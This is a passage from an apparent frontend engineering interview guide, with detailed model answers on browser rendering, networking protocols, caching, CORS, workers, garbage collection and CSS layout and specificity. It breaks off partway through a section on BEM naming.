# Frontend Engineer Interview Questions (55+ Detailed Q&A)

## 1. Browser Internals & Network

<AccordionGroup>
<Accordion title="1. What happens when you type a URL?">
**Answer:**

The way I think about this is as a pipeline of seven distinct phases, each with its own optimization surface:

1. **DNS Lookup** -- The browser checks its local cache, then the OS cache, then the router cache, then the ISP's recursive resolver, and finally queries authoritative nameservers. A cold DNS lookup can take 20-120ms. Optimization: `dns-prefetch` hints, or using a fast public DNS like Cloudflare's 1.1.1.1.
2. **TCP Handshake (SYN -> SYN-ACK -> ACK)** -- Three-way handshake establishes a reliable connection. This costs one round-trip time (RTT), which matters enormously for users on mobile networks with 200ms+ RTTs.
3. **TLS Handshake** -- For HTTPS, another 1-2 RTTs to negotiate cipher suites and exchange keys. TLS 1.3 reduced this to a single RTT (and supports 0-RTT resumption, though that has replay-attack trade-offs).
4. **HTTP Request** -- Browser sends GET with headers (Accept, Cookie, User-Agent). Connection reuse via `keep-alive` in HTTP/1.1 or multiplexing in HTTP/2 avoids repeating steps 2-3.
5. **Server Processing & Response** -- Server processes the request (routing, DB queries, template rendering) and streams back the HTML. Time-to-First-Byte (TTFB) measures this. A good TTFB is under 200ms for static, under 600ms for dynamic.
6. **HTML Parsing & Resource Discovery** -- The parser builds the DOM token by token. When it encounters `<link>` or `<script>`, it triggers additional fetches. The **preload scanner** looks ahead to discover resources even while the main parser is blocked.
7. **Render Pipeline: DOM + CSSOM -> Render Tree -> Layout -> Paint -> Composite** -- The critical detail most people miss: CSS is render-blocking (the browser won't paint until CSSOM is built), and synchronous JS is parser-blocking (DOM construction pauses). This is why the Critical Rendering Path matters.

**Example:** At a company like Shopify, shaving 100ms off this pipeline for their checkout flow directly correlated with a 1.3% increase in conversion rate, which translated to millions in revenue.

**What interviewers are really testing:** Whether you understand the full stack from network to pixels, and whether you can identify which phase to optimize for a given performance bottleneck. Senior candidates should naturally mention optimization opportunities at each step.

**Red flag answer:** Listing the steps like a memorized checklist without understanding *why* each step exists or how to optimize it. Saying "the browser renders the page" without mentioning DOM/CSSOM construction or the render pipeline.

**Follow-up:**
- What is the preload scanner, and why does it exist? How does it differ from the main HTML parser?
- How does HTTP/2 multiplexing change the optimization strategy compared to HTTP/1.1 (where we used domain sharding and sprite sheets)?
- If a user reports "the page is slow," how do you determine which phase of this pipeline is the bottleneck?
</Accordion>

<Accordion title="2. Critical Rendering Path">
**Answer:**

The Critical Rendering Path (CRP) is the minimum sequence of steps the browser must complete before it can render the first pixel on screen. The key insight is that **render time is not about total resource size -- it's about the critical chain of dependent resources**.

The CRP consists of:
1. **HTML -> DOM** -- Parsed incrementally, but synchronous `<script>` tags block this.
2. **CSS -> CSSOM** -- All CSS is render-blocking by default because the browser needs the complete CSSOM before it knows how anything should look. If you paint before CSS loads, you get a Flash of Unstyled Content (FOUC).
3. **DOM + CSSOM -> Render Tree** -- Only visible elements (no `display: none`, no `<head>` content). This is where the browser determines *what* to render.
4. **Layout (Reflow)** -- Computes exact geometry: x, y, width, height for every node.
5. **Paint** -- Fills in pixels: colors, borders, shadows, text.
6. **Composite** -- Layers are composited on the GPU. Elements with `transform` or `opacity` get their own compositor layer.

**Optimization strategies (in order of impact):**
- **Inline critical CSS** (the CSS needed for above-the-fold content) directly in `<head>`, then load the rest asynchronously. Tools like `critical` or `critters` automate this.
- **Defer non-critical JS** with `defer` (executes after DOM is parsed, in order) or `async` (executes as soon as downloaded, no order guarantee). The gotcha: `async` scripts can still block the `DOMContentLoaded` event.
- **Reduce critical resource count** -- Every synchronous CSS/JS file in `<head>` extends the critical path. Concatenate or inline them.
- **Reduce critical bytes** -- Minify, compress, and eliminate unused CSS (tools like PurgeCSS can cut CSS bundles by 80-95%).

**Example:** A news site had an LCP of 4.2s. The culprit: 6 render-blocking CSS files totaling 340KB in `<head>`. By inlining 8KB of critical CSS and loading the rest with `media="print" onload="this.media='all'"`, LCP dropped to 1.8s.

**What interviewers are really testing:** Do you understand *why* CSS is render-blocking and JS is parser-blocking? Can you reason about the dependency graph of resources? This separates someone who memorized "put scripts at the bottom" from someone who understands the underlying model.

**Red flag answer:** "Just put CSS in the head and scripts at the bottom." This was 2012 advice. Modern answers should discuss `async`/`defer`, critical CSS extraction, and how to measure the actual critical path using Chrome DevTools Performance panel or WebPageTest's filmstrip view.

**Follow-up:**
- What is the difference between `async` and `defer` on a `<script>` tag, and when would you choose each?
- How would you identify which CSS is "critical" for a page with complex responsive layouts?
- A page has good TTFB (200ms) but terrible FCP (3.5s). What is your debugging approach?
</Accordion>

<Accordion title="3. Event Bubbling vs Capturing">
**Answer:**

DOM events follow a three-phase lifecycle, and understanding this is essential for building performant, maintainable UIs:

1. **Capture Phase** -- The event travels from `window` down through the DOM tree to the target element. Almost nobody uses this phase, but it is powerful for intercepting events before they reach their target (e.g., a global click handler that prevents navigation for unsaved forms).
2. **Target Phase** -- The event fires on the exact element that was clicked/interacted with.
3. **Bubble Phase** (default) -- The event travels back up from the target to `window`. This is what most developers interact with.

**Key APIs:**
- `addEventListener('click', handler, true)` -- The third argument `true` registers the handler in the *capture* phase.
- `event.stopPropagation()` -- Prevents the event from continuing to the next phase/element. Use sparingly -- it makes debugging harder and breaks other listeners that depend on seeing the event.
- `event.stopImmediatePropagation()` -- Stops other listeners *on the same element* from firing too.
- `event.preventDefault()` -- Completely different: stops the browser's *default action* (e.g., form submission, link navigation), not the event propagation.

**Event Delegation -- the real production pattern:**

Instead of attaching a click handler to each of 10,000 list items, attach one handler to the parent `<ul>` and use `event.target` to determine which item was clicked. This is:
- **Memory efficient** -- 1 listener vs 10,000.
- **Dynamic** -- Automatically handles items added later via JS.
- **The pattern behind React's event system** -- React attaches a single listener at the root and dispatches synthetically. In React 17+, this root is the React root element (not `document` as in earlier versions).

**Gotcha in production:** `event.target` vs `event.currentTarget`. If your list item contains a `<span>`, clicking the span makes `event.target` the span, not the `<li>`. You need `event.target.closest('li')` to reliably find the delegated element. This trips up junior developers constantly.

**What interviewers are really testing:** Whether you understand how the browser's event system works at a fundamental level, and whether you can apply delegation as a pattern. Senior candidates should connect this to React's synthetic event system and discuss trade-offs of `stopPropagation`.

**Red flag answer:** Not knowing the three phases, or confusing `stopPropagation()` with `preventDefault()`. Also: suggesting `stopPropagation()` as a first resort for event conflicts instead of restructuring the handler logic.

**Follow-up:**
- Why did React 17 move its event delegation from `document` to the React root container? What problem did this solve?
- You have a modal with a close-on-outside-click behavior, but clicks inside the modal's dropdown also close it. How do you fix this without `stopPropagation`?
- What are passive event listeners, and why do they matter for scroll performance?
</Accordion>

<Accordion title="4. Reflow vs Repaint">
**Answer:**

This is fundamentally about understanding the browser's rendering pipeline and which operations trigger which stages:

- **Reflow (Layout)** -- Triggered when the browser needs to recalculate the geometry (position, size) of elements. This is the **most expensive** operation because changes cascade: resizing a parent forces recalculation of all children. Triggers include: changing `width`, `height`, `padding`, `margin`, `font-size`, reading layout properties like `offsetHeight` or `getBoundingClientRect()`, adding/removing DOM elements.
- **Repaint** -- Triggered when visual properties change that don't affect layout: `color`, `background-color`, `visibility`, `box-shadow`. Cheaper than reflow, but still involves the CPU.
- **Composite-only changes** -- Only `transform` and `opacity` (plus `filter` in most browsers) can be handled entirely by the GPU compositor without involving the main thread. This is why all performant animations use `transform: translateX()` instead of `left`, and `opacity` instead of `visibility`.

**The performance trap most people miss: Forced Synchronous Layout (Layout Thrashing).**

When you read a layout property (like `offsetHeight`) after writing a style change, the browser is *forced* to synchronously calculate layout before returning the value. In a loop, this is devastating:

```javascript
// BAD: Forces layout on every iteration (layout thrashing)
for (let i = 0; i < items.length; i++) {
  items[i].style.width = container.offsetWidth + 'px'; // read then write
}

// GOOD: Batch read, then batch write
const width = container.offsetWidth; // one read
for (let i = 0; i < items.length; i++) {
  items[i].style.width = width + 'px'; // all writes
}
```

**Production-grade optimization strategies:**
- Use `transform` for animations instead of `top`/`left` (composite-only, 60fps).
- Batch DOM reads and writes (or use `requestAnimationFrame` to defer writes to the next frame).
- Use `will-change: transform` to promote elements to their own compositor layer -- but sparingly, as each layer consumes GPU memory.
- Libraries like `fastdom` enforce read/write batching automatically.
- For complex list updates, `content-visibility: auto` lets the browser skip layout/paint for off-screen content, saving significant work on long pages.

**What interviewers are really testing:** Do you understand *why* certain CSS properties are expensive and others are cheap? Can you diagnose a janky animation? The concept of layout thrashing separates junior from senior frontend engineers.

**Red flag answer:** "Reflow is expensive, repaint is cheap" without being able to explain *why*, or not knowing about compositor layers and `transform`-based animations. Also: suggesting `will-change` as a blanket performance fix.

**Follow-up:**
- How would you use Chrome DevTools to diagnose layout thrashing in a real application?
- What is `content-visibility: auto` and how does it help with rendering performance for long scrollable lists?
- You are animating a sidebar sliding in. Using `left: 0 to left: -300px` causes jank. How do you fix it and why does the fix work?
</Accordion>

<Accordion title="5. HTTP/2 and HTTP/3">
**Answer:**

These protocols represent fundamental shifts in how browsers communicate with servers, and each solved specific limitations of its predecessor:

**HTTP/1.1 problems:**
- One request per TCP connection at a time (head-of-line blocking). Browsers worked around this with 6 parallel connections per domain.
- Developers invented domain sharding, sprite sheets, and CSS concatenation to work around these limits.

**HTTP/2 improvements:**
- **Multiplexing** -- Multiple requests/responses over a single TCP connection, interleaved as frames. This eliminated the need for domain sharding and made many concatenation hacks unnecessary.
- **Header Compression (HPACK)** -- Headers like Cookie and User-Agent repeat on every request. HPACK compresses them using a shared dictionary, saving 80-90% of header bytes.
- **Server Push** -- Server can proactively send resources the client hasn't requested yet. In practice, this was poorly adopted (hard to get right without pushing stale resources) and Chrome deprecated it in 2022. The replacement pattern: `103 Early Hints`.
- **Stream Prioritization** -- Clients can indicate which resources matter most. In practice, browser implementations were inconsistent and this caused more problems than it solved.

**HTTP/3 (QUIC) improvements:**
- **QUIC runs on UDP instead of TCP** -- This sounds radical but it means QUIC implements its own reliability/congestion control with better defaults.
- **Eliminates TCP-level head-of-line blocking** -- In HTTP/2, a single lost TCP packet blocks ALL streams. In HTTP/3, packet loss on one stream doesn't affect others. This is the killer feature.
- **0-RTT connection resumption** -- For repeat visitors, the connection setup is essentially instant (though 0-RTT has replay attack considerations for non-idempotent requests).
- **Connection migration** -- A QUIC connection survives network changes (e.g., switching from WiFi to cellular). This is transformative for mobile users.

**Real-world impact:** Google reported a 2% improvement in search latency and a 15% reduction in rebuffering for YouTube when switching to QUIC. Cloudflare found HTTP/3 reduced TTFB by 12.4% for mobile users in high-latency regions.

**What interviewers are really testing:** Whether you understand the *why* behind protocol evolution, not just feature lists. The TCP head-of-line blocking distinction between HTTP/2 and HTTP/3 is the critical insight. Also: whether you know that "just enable HTTP/2" isn't a magic bullet -- it changes optimization strategies.

**Red flag answer:** Listing features without understanding the problems they solve. Mentioning Server Push as a current best practice. Not knowing that HTTP/2 actually introduced a *different* head-of-line blocking problem at the TCP layer.

**Follow-up:**
- Why was HTTP/2 Server Push deprecated, and what replaced it?
- How does HTTP/2 change your bundling strategy compared to HTTP/1.1? Should you still concatenate all JS into one file?
- A user in India on a flaky mobile connection reports slow page loads. How might HTTP/3 help specifically for their scenario?
</Accordion>

<Accordion title="6. Browser Cache Strategies">
**Answer:**

Caching is the single highest-leverage performance optimization for returning visitors. The key is understanding the **two-tier model**: the browser decides whether to revalidate based on freshness, then the server confirms via validation.

**Freshness (Skip the network entirely):**
- `Cache-Control: max-age=31536000` -- Cache for one year. Use for **immutable assets** (files with content hashes in their names like `app.a1b2c3.js`). The most aggressive and most effective caching.
- `Cache-Control: no-cache` -- Misleading name: it caches the resource but *always revalidates* with the server before using it. Good for HTML documents.
- `Cache-Control: no-store` -- Never cache. Use for sensitive data (bank statements, medical records).
- `Cache-Control: stale-while-revalidate=86400` -- Serve stale content immediately while fetching a fresh version in the background. Excellent for content that changes but where slight staleness is acceptable (blog posts, product listings).

**Validation (Conditional requests):**
- `ETag` + `If-None-Match` -- Server sends a hash of the content. Browser sends it back on revalidation. If it matches, server returns `304 Not Modified` (no body), saving bandwidth.
- `Last-Modified` + `If-Modified-Since` -- Date-based validation. Less precise than ETag (1-second granularity).

**The production-grade caching strategy:**
- **HTML**: `Cache-Control: no-cache` (always revalidate, so users get new deploys immediately).
- **Hashed assets** (JS, CSS, images): `Cache-Control: max-age=31536000, immutable`. Since the filename changes when content changes, you never serve stale code.
- **API responses**: Varies. Consider `stale-while-revalidate` for read-heavy, infrequently-changing data.

**Service Worker Cache (the third tier):**
- Programmatic cache with full control over the strategy: Cache-First (offline-friendly), Network-First (freshness-prioritized), Stale-While-Revalidate (speed + freshness).
- Workbox (by Google) is the de facto library for Service Worker caching strategies.
- **Gotcha:** Service Worker cache is independent of HTTP cache. If your Service Worker caches a resource and you deploy new assets, users may see stale content until the new Service Worker activates (which requires a page reload by default).

**What interviewers are really testing:** Whether you can design a real caching strategy, not just recite header names. The hashed-assets + no-cache-HTML pattern is table stakes for senior frontend engineers.

**Red flag answer:** Confusing `no-cache` with `no-store`. Not knowing about content-hashed filenames. Suggesting `max-age` on HTML files (this traps users on stale deployments).

**Follow-up:**
- You deployed a critical bugfix, but users are still seeing the old version. Your JS files use content hashing. What could be going wrong?
- How does the `Vary` header affect caching, and when would you use it?
- Explain the Service Worker lifecycle and the "waiting" phase. Why does it exist, and how does it affect cache updates?
</Accordion>

<Accordion title="7. Worker Threads">
**Answer:**

JavaScript is single-threaded, but workers provide genuine multi-threading in the browser. Each worker type serves a fundamentally different purpose:

**Web Worker:**
- Runs JavaScript on a **separate OS thread**. Has its own event loop, its own global scope (`self`, not `window`).
- **No DOM access** -- communicates with the main thread via `postMessage()` and structured cloning (deep copy of data). For large data, use `Transferable` objects (like `ArrayBuffer`) for zero-copy transfers.
- **Use case:** CPU-intensive computation that would block the main thread and cause jank. Examples: image processing, CSV/Excel parsing, cryptographic operations, complex search/filtering on large datasets.
- **SharedArrayBuffer + Atomics** -- Enables shared memory between workers (true parallelism), but requires `Cross-Origin-Isolation` headers (`COOP` + `COEP`). This was restricted after Spectre.

**Service Worker:**
- A **network proxy** that sits between the browser and the network. It intercepts every fetch request from the page.
- Lifecycle: Install -> Activate -> Idle (terminated when not in use, restarted on events). This lifecycle is what makes them tricky -- you must handle updates carefully.
- **Use cases:** Offline support (PWAs), background sync, push notifications, caching strategies.
- **Key constraint:** No DOM access. Can only communicate with pages via `postMessage` or the `Clients` API.
- **Gotcha:** A bug in your Service Worker can break your site for all users, and it persists across sessions. Always include an "escape hatch" (a `/sw-kill` route that unregisters the SW).

**Worklet (Paint, Animation, Layout):**
- Lightweight worker that hooks into the browser's rendering pipeline. Runs on the **render thread**, not the main thread.
- **Paint Worklet (Houdini):** Custom CSS painting via `registerPaint()`. Example: procedural backgrounds, custom borders that would be impossible with CSS alone.
- **Animation Worklet:** Run animations synchronized with the compositor, off the main thread. Enables scroll-linked animations that stay smooth at 60fps regardless of main thread load.
- **Layout Worklet:** Custom layout algorithms (experimental).

**Real-world example:** Figma uses Web Workers extensively for their rendering engine. Heavy computations (layout algorithms, constraint solving) run in workers, keeping the canvas interaction smooth. They also use `SharedArrayBuffer` for shared state between the main thread and workers.

**What interviewers are really testing:** Do you know when to reach for each worker type? The nuance is in understanding thread boundaries and communication costs. A candidate who mentions `Transferable` objects and `SharedArrayBuffer` demonstrates real production experience.

**Red flag answer:** "Web Workers are like threads" without understanding the communication model. Not knowing the difference between a Service Worker and a Web Worker. Thinking Worklets are just "small workers."

**Follow-up:**
- What is the cost of `postMessage()`, and how does structured cloning impact performance for large datasets? How would you optimize it?
- A user reports that your PWA shows stale content after a deploy. Walk me through how the Service Worker update lifecycle could cause this and how you would fix it.
- When would you use `SharedArrayBuffer` vs `postMessage` with `Transferable` objects?
</Accordion>

<Accordion title="8. V8 Garbage Collection">
**Answer:**

Understanding V8's GC is critical for diagnosing memory leaks and performance issues in production JavaScript applications.

**Generational Hypothesis:** Most objects die young. V8 exploits this by splitting the heap:

- **Young Generation (Nursery/Scavenger):**
  - Small (~1-8MB), collected frequently using a **semi-space (Cheney's) algorithm**.
  - Two equal-sized spaces: "from" and "to". Live objects are copied from "from" to "to", then spaces swap. Dead objects are reclaimed instantly (no sweep phase).
  - Objects that survive two scavenge cycles are promoted to old generation.
  - Very fast (~1-2ms pauses), but copying cost is proportional to live object count.

- **Old Generation (Major GC):**
  - Larger (hundreds of MB to GB). Collected using **Mark-Sweep-Compact**.
  - **Mark phase:** Traverses from roots (global object, stack) and marks reachable objects. V8 uses **incremental marking** -- breaks the mark phase into small chunks interleaved with JavaScript execution (5ms slices) to avoid long pauses.
  - **Sweep phase:** Reclaims unmarked memory. Can be done concurrently on a background thread.
  - **Compact phase:** Defragments memory by moving objects together (reduces fragmentation, improves cache locality). Only runs when fragmentation exceeds a threshold.

- **Orinoco (Parallel/Concurrent GC):**
  - V8's modern GC architecture. Key innovations: concurrent marking (mark phase runs on background threads while JS executes), parallel scavenging (multiple threads evacuate the young generation), concurrent sweeping.
  - Result: GC pauses under 1ms for young generation, under 5-10ms for old generation in most cases.

**Practical implications for frontend:**
- Avoid creating many short-lived objects in hot loops (e.g., allocating `{x, y}` objects every frame in an animation). This pressure on the young generation causes frequent scavenges.
- **Hidden classes (Maps):** V8 optimizes property access using hidden classes. Adding properties in different orders to objects of the same "type" creates different hidden classes, defeating optimizations. Always initialize all properties in the constructor.
- **Closures hold references:** A closure that captures a variable keeps the entire scope chain alive. This is the #1 source of memory leaks in React apps (event handlers in `useEffect` that capture stale state).

**What interviewers are really testing:** Whether you have ever profiled memory in a real application, or if this is purely theoretical knowledge. Mentioning Chrome DevTools' Memory panel, heap snapshots, and allocation timelines shows real experience.

**Red flag answer:** "JavaScript has garbage collection so you don't need to worry about memory." This is the answer of someone who has never debugged a production memory leak.

**Follow-up:**
- How would you use Chrome DevTools to identify a memory leak in a React SPA? Walk me through the process.
- What are "detached DOM nodes" and why are they one of the most common memory leaks in SPAs?
- How does V8's hidden class system affect performance, and what coding patterns should you avoid to maintain monomorphic call sites?
</Accordion>

<Accordion title="9. Resource Hints">
**Answer:**

Resource hints let you inform the browser about resources it will need, enabling it to start work early. The key is choosing the right hint for the right situation -- misuse wastes bandwidth and can actually hurt performance.

- **`preload`** -- **"You WILL need this for the current page, fetch it NOW."** High priority. Use for resources discovered late in the HTML (fonts loaded via CSS, hero images referenced in CSS, dynamically-loaded JS modules). The browser fetches immediately with high priority. **Must** specify `as="font"`, `as="image"`, etc. for correct prioritization. **Gotcha:** If you preload something but never use it within ~3 seconds, Chrome logs a console warning and you wasted bandwidth.

- **`prefetch`** -- **"You MIGHT need this for the NEXT navigation."** Low priority. Fetched during idle time. Use for resources on the likely next page (e.g., prefetch the JS bundle for the `/dashboard` route when user is on `/login`). **Gotcha:** On mobile with metered connections, browsers may ignore prefetch entirely.

- **`preconnect`** -- **"I will need something from this origin, start connecting now."** Performs DNS lookup + TCP handshake + TLS negotiation ahead of time. Saves 100-300ms per connection. Use for critical third-party origins (CDN, API server, font provider). **Limit to 2-4 origins** -- each preconnect holds a socket open.

- **`dns-prefetch`** -- DNS-only version of preconnect. Lighter weight, use for lower-priority third-party origins.

- **`modulepreload`** -- Like preload but specifically for ES modules. Also parses and compiles the module in advance, not just fetches it. More efficient than `preload` for JavaScript modules.

- **`fetchpriority`** (Fetch Priority API) -- Not technically a hint but adjacent: `fetchpriority="high"` on an `<img>` boosts its priority (useful for LCP image), `fetchpriority="low"` deprioritizes below-the-fold images.

**Real-world strategy example:** On an e-commerce product page:
```html
<!-- Preconnect to CDN that serves product images -->
<link rel="preconnect" href="https://images.cdn.example.com">
<!-- Preload the hero product image (LCP element) -->
<link rel="preload" as="image" href="/images/hero-product.webp" fetchpriority="high">
<!-- Preload font that is loaded via CSS @font-face -->
<link rel="preload" as="font" href="/fonts/brand.woff2" type="font/woff2" crossorigin>
<!-- Prefetch the cart page bundle for likely next navigation -->
<link rel="prefetch" href="/cart-bundle.js">
```

**What interviewers are really testing:** Do you understand priority and timing well enough to choose the right hint? Overusing `preload` is a common mistake that degrades performance by competing with critical resources for bandwidth.

**Red flag answer:** Using `preload` and `prefetch` interchangeably. Not knowing that `crossorigin` is required on font preloads (even for same-origin fonts). Loading 20 resources with `preload` and wondering why nothing got faster.

**Follow-up:**
- What happens if you preload a resource but never actually use it? What is the browser behavior?
- How does the Fetch Priority API interact with `preload`, and when would you use `fetchpriority="high"` vs `preload`?
- You are building a multi-page e-commerce site. Describe your resource hint strategy for the product listing page, considering what the user is likely to navigate to next.
</Accordion>

<Accordion title="10. CORS (Cross-Origin Resource Sharing)">
**Answer:**

CORS is a **browser-enforced security mechanism** that controls which origins can access resources from another origin. The critical distinction: **CORS is enforced by the browser, not the server.** The server sends headers; the browser decides whether to allow the response through to JavaScript.

**Same-Origin Policy:** By default, JavaScript on `app.example.com` cannot read responses from `api.different.com`. An origin is defined by the tuple: `(scheme, host, port)`. Even `http` vs `https` on the same domain is cross-origin.

**Simple Requests (no preflight):**
- GET, HEAD, or POST with simple headers (Accept, Content-Type limited to `text/plain`, `multipart/form-data`, `application/x-www-form-urlencoded`).
- Browser sends the request directly, checks `Access-Control-Allow-Origin` in the response.

**Preflighted Requests:**
- Any request with custom headers (like `Authorization`), non-simple Content-Type (`application/json`), or methods like PUT/DELETE triggers a **preflight OPTIONS request** first.
- The preflight asks: "Is this cross-origin request allowed?" The server responds with allowed methods, headers, and max-age (how long to cache the preflight result).
- **Performance impact:** Every preflighted request costs an extra round trip. `Access-Control-Max-Age` caches the preflight result (Chrome caps at 2 hours; Firefox at 24 hours).

**Credentialed Requests:**
- If you need to send cookies cross-origin: `fetch(url, `{` credentials: 'include' }`)`.
- Server must respond with `Access-Control-Allow-Credentials: true` AND must specify an exact origin (not `*`).
- This is where most production CORS bugs occur: `Access-Control-Allow-Origin: *` with credentials is explicitly rejected by the browser.

**Common production pitfalls:**
- **Wildcard with credentials** -- won't work. You need to dynamically set the `Allow-Origin` header to the requesting origin (validate against a whitelist!).
- **Forgetting `Vary: Origin`** -- If your server dynamically sets the `Allow-Origin` header, you must include `Vary: Origin` or CDN caches may serve a response with the wrong origin to a different requester.
- **Opaque responses** -- `no-cors` mode fetches succeed but return an "opaque" response that JavaScript can't read. This is useful for `<img>` tags but not for data fetching.

**What interviewers are really testing:** Whether you have actually debugged CORS issues in production, or just know the acronym. The `Vary: Origin` CDN interaction and the credentials + wildcard conflict are the litmus tests for real experience.

**Red flag answer:** "Just set `Access-Control-Allow-Origin: *`" without understanding the credentials caveat. Thinking CORS is a server-side security mechanism (it is browser-enforced). Suggesting disabling CORS in production (you can't; it is a browser feature).

**Follow-up:**
- Why does a CORS error appear in the browser console even though the network tab shows a 200 OK response?
- How does a CDN caching layer interact with CORS, and what role does the `Vary` header play?
- You are building a frontend that talks to three different backend services on different subdomains. How do you design your CORS configuration?
</Accordion>

<Accordion title="11. Box Model">
**Answer:**

The CSS Box Model is the foundation of all layout in CSS. Every element is a rectangular box composed of four layers:

1. **Content** -- The actual text, image, or child elements. Sized by `width`/`height`.
2. **Padding** -- Space between content and border. Background color/image extends into padding.
3. **Border** -- Visible edge. Has its own width, style, and color.
4. **Margin** -- Space outside the border. Transparent. Creates spacing between elements.

**The critical distinction -- `box-sizing`:**
- **`content-box` (default in CSS spec):** `width` only applies to the content. Total rendered width = `width` + `padding-left` + `padding-right` + `border-left` + `border-right`. This is deeply counterintuitive: a `width: 100px` element with `padding: 20px` and `border: 5px` is actually 150px wide.
- **`border-box`:** `width` includes content + padding + border. A `width: 100px` element is 100px wide regardless of padding/border. This is what every modern project uses.

**The universal reset (and why it exists):**
```css
*, *::before, *::after {
  box-sizing: border-box;
}
```
Every CSS reset/normalize includes this. Without it, calculations like `width: 50%` break the moment you add padding.

**Margin Collapse -- the gotcha that trips up even experienced developers:**
- Vertical margins between adjacent block elements **collapse**: the larger margin wins, they don't add up. Two siblings with `margin-bottom: 20px` and `margin-top: 30px` have 30px between them, not 50px.
- **Doesn't happen:** horizontally, with floats, with flex/grid children, with absolutely positioned elements, or when padding/border separates parent and child.
- Parent-child margin collapse is especially confusing: a child's `margin-top` can "escape" the parent if the parent has no border, padding, or BFC.

**What interviewers are really testing:** Whether you've been burned by margin collapse and `content-box` math in production. This is not a theoretical question -- it's a "have you actually built layouts" question.

**Red flag answer:** Not knowing about `border-box`, or not being able to explain margin collapse. These are fundamentals that directly affect daily CSS work.

**Follow-up:**
- What is margin collapse, and can you describe a scenario where a child element's margin unexpectedly affects its parent?
- How does `box-sizing: border-box` interact with `calc()` and percentage-based layouts?
- What is the relationship between the box model and the Block Formatting Context (BFC)?
</Accordion>

<Accordion title="12. Flexbox vs Grid">
**Answer:**

The way I think about this: **Flexbox is content-out (the content dictates the layout), Grid is layout-in (the layout dictates where content goes).** They are complementary, not competing.

**Flexbox (1D Layout):**
- Works along a **single axis** (row or column) at a time.
- Items flex to fill available space based on `flex-grow`, `flex-shrink`, and `flex-basis`.
- Content drives sizing: items can grow or shrink based on their content.
- Best for: navigation bars, button groups, card rows that wrap, centering elements, any layout where the number of items is dynamic.
- **The `flex` shorthand trap:** `flex: 1` means `flex: 1 1 0%` (grow, shrink, basis of 0). `flex: auto` means `flex: 1 1 auto` (basis is the item's natural size). This distinction matters for equal-width vs content-proportional columns.

**Grid (2D Layout):**
- Works along **both axes simultaneously**.
- You define the grid structure (rows and columns) and place items into it.
- Layout drives sizing: cells exist regardless of whether content fills them.
- Best for: page layouts, dashboard grids, any layout where you need precise 2D alignment.
- `grid-template-columns: repeat(auto-fill, minmax(250px, 1fr))` -- The single most useful Grid pattern. Creates a responsive grid that auto-adjusts column count based on container width. No media queries needed.
- `subgrid` -- A Grid child can inherit its parent's grid tracks, enabling alignment across nested grids. This solved the "cards with different-height sections" problem.

**When to use which -- real decision framework:**
| Scenario | Choose |
|---|---|
| Navigation bar with variable items | Flexbox |
| Page layout with header, sidebar, main, footer | Grid |
| Card row that wraps responsively | Flexbox (or Grid with `auto-fill`) |
| Dashboard with fixed widget slots | Grid |
| Centering a single element | Flexbox (`display: flex; place-items: center;` -- yes, `place-items` works in Flexbox too!) |
| Complex form layout | Grid |

**The hybrid pattern in production:** Use Grid for the overall page layout, Flexbox for component-level alignment within grid cells. A page might have a CSS Grid for the 3-column layout, with Flexbox inside each card for aligning the title, body, and footer vertically.

**What interviewers are really testing:** Not just "do you know Flexbox and Grid" but can you articulate *when* to use each and *why*. The 1D vs 2D distinction is the foundation. Mentioning `subgrid` and `auto-fill`/`auto-fit` shows you're current.

**Red flag answer:** "I always use Flexbox" or "I always use Grid." Also: not knowing the difference between `auto-fill` and `auto-fit` in Grid. Not being able to explain `flex-basis` and the `flex` shorthand.

**Follow-up:**
- What is the difference between `auto-fill` and `auto-fit` in `grid-template-columns`? When does it matter?
- How does `flex-shrink` work when items overflow their container, and what is the `min-width: auto` gotcha?
- Describe how you would implement a responsive card layout that shows 1 column on mobile, 2 on tablet, and 3 on desktop -- without media queries.
</Accordion>

<Accordion title="13. Specificity Calculation">
**Answer:**

Specificity determines which CSS rule wins when multiple rules target the same element. It is calculated as a **tuple, not a single number** -- a common misconception.

**The specificity hierarchy (from highest to lowest):**
1. **Inline styles** (`style="..."`) -- Specificity: `(1,0,0,0)`. Overrides everything except `!important`.
2. **ID selectors** (`#header`) -- Specificity: `(0,1,0,0)`. A single ID outweighs any number of classes.
3. **Class selectors, attribute selectors, pseudo-classes** (`.active`, `[type="text"]`, `:hover`) -- Specificity: `(0,0,1,0)`.
4. **Element selectors, pseudo-elements** (`div`, `::before`) -- Specificity: `(0,0,0,1)`.

**Key rules:**
- `*` (universal selector) has zero specificity.
- `:where()` -- **zero specificity** regardless of its arguments. This is transformative for utility CSS and resets: `:where(.card) .title` has specificity `(0,0,1,0)`, not `(0,0,2,0)`.
- `:is()` and `:not()` -- take the specificity of their **most specific argument**. `:is(#id, .class)` has specificity `(0,1,0,0)`.
- `!important` is not a specificity level -- it creates a separate cascade layer. `!important` rules fight among themselves using the same specificity rules.

**CSS Cascade Layers (`@layer`) -- the modern solution to specificity wars:**
```css
@layer reset, base, components, utilities;

@layer reset { /* lowest priority */ }
@layer utilities { /* highest priority */ }
```
Layers provide explicit control over which styles win, regardless of specificity. This is how modern CSS frameworks (Tailwind v4, Open Props) manage specificity without `!important` or overly specific selectors.

**Real-world specificity strategy:**
- Prefer class-based selectors (specificity `0,0,1,0`) for consistency.
- Avoid ID selectors in stylesheets (too specific, hard to override).
- Use `@layer` for managing third-party CSS vs your own.
- The BEM methodology (.block__element--modifier) keeps all selectors at one class level of specificity.

**What interviewers are really testing:** Whether you have fought and won specificity wars in production. Mentioning `@layer`, `:where()`, and the BEM connection shows you understand modern CSS architecture, not just a 2015 specificity chart.

**Red flag answer:** Thinking 11 classes beat 1 ID (they don't -- specificity is a tuple, not a score). Reaching for `!important` as the first solution. Not knowing about `@layer` or `:where()`.

**Follow-up:**
- What are CSS Cascade Layers (`@layer`), and how do they change the way we manage specificity in large codebases?
- You are integrating a third-party CSS library that uses high-specificity selectors that conflict with your styles. How do you solve this without `!important`?
- What is the specificity of `:not(.foo):is(#bar, .baz)`?
</Accordion>

<Accordion title="14. BEM Methodology">
**Answer:**

BEM (Block Element Modifier) is a CSS naming convention that solves the **global scope problem** of CSS by creating a structured, predictable naming pattern.

**Structure:**
- **Block:** A standalone, reusable component. `.card`, `.nav`, `.search-form`.
- **Element:** A part of a block that has no standalone meaning. `.card__title`, `.card__image`, `.card__footer`. Uses double underscore.
- **Modifier:** A variant or state of a block or element. `.card--featured`, `.card__title--large`. Uses double hyphen.

**Why BEM works:**
- **Flat specificity:** Everything is a single class selector (`0,0,1,0`). No nesting, no IDs, no specificity escalation.
- **Self-documenting:** `.search-form__input--disabled` tells you exactly what it is: a disabled input inside a search form.
